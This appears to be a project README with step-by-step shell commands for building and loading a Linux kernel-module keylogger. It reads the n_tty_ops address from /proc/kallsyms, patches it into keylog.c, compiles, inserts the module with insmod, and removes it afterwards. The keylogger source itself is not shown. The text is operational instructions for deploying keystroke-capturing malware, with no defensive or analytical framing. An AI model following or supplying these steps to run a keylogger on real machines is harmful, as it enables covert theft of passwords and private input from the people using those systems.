# Instructions on running the keylogger manually

First, get the address of n\_tty\_ops. NOTE: This address seems to change every time so this step cannot be skipped, otherwise you will get unexpected results:

`$ sudo grep n_tty_ops /proc/kallsyms`

Then, you get something like this (the address will be slightly different):

`ffffffffb55700c0 d n_tty_ops`

Then, in the keylog.c file, go to this line and replace the address with the one from above. Do not forget to append the 0x in the beginning of the address: 

`#define N_TTY_OPS_ADDR 0xffffffffb8b700c0;`

Save, then run makefile.

`$ make`

Then, you'll get keylog.ko file. Insert the module into the kernel.

`$ sudo insmod keylog.ko`

You can double check to see if the kernel was loaded properly by checking if there is "keylog" inside:

`$ lsmod`

Printk messages from the code can be seen with (Printf is not available for kernel modules):

`$ dmesg`

Keylogger module can be removed with:

`$ sudo rmmod keylog`
